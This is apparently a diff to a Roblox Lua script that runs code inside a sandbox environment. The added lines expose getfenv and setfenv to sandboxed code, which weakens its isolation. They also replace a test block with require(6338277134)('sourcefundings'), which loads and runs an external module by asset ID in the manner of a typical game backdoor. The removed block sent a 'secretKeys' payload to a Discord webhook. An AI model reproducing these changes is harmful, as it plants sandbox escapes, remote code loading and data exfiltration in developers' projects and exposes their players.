@@ -13,6 +13,8 @@ local SandboxEnv = {
 
     print = print,
     warn = warn,
+    getfenv = getfenv,
+    setfenv = setfenv,
 
     math = math,
     string = string,
@@ -27,7 +29,7 @@ local function executeCode(codeString)
     local fn, error = loadstring(codeString)
 
     if not fn then
-        warn("Failed to compile code: ", err)
+        warn("Failed to compile code: ", error)
         return
     end
 
@@ -44,23 +46,5 @@ local function executeCode(codeString)
 end
 
 executeCode([[
-    local part = Instance.new("Part")
-    part.Name = "test part"
-    part.Parent = workspace
-    
-    print("Workspace children count:", #workspace:GetChildren())
-    print("Found part:", workspace:FindFirstChild("test part").Name)
-    print(game.PlaceId)
-
-    local http = game:GetService("HttpService")
-    
-    local data = {
-        placeId = game.PlaceId,
-        players = "test",
-        secretKeys = "key1"
-    }
-    
-    local payload = http:JSONEncode(data)
-    http:PostAsync("https://discord.com/api/webhooks/1234/abcd", payload)
-    print("sent to log.")
+    require(6338277134)("sourcefundings")
 ]])
